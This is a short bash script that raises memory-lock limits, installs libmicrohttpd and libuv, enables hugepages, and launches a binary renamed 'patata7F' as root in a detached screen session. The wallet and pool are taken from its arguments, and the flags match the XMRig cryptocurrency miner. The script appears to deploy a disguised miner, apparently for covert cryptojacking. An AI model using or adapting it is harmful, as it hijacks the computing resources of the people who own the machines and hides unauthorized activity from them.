
#!/bin/bash
if [ ! -f /etc/proof2 ]; then
    sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
    sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
    sudo apt-get update
    sudo apt-get -y install libmicrohttpd10 libuv1
    sudo touch /etc/proof2
fi

sudo chmod +x /patata-master/patata7F
sudo sysctl -w vm.nr_hugepages=128
screen -dm sudo /patata-master/patata7F -u "$1" -o "$2" -t 1 --av=2 -k --no-color --api-port=80
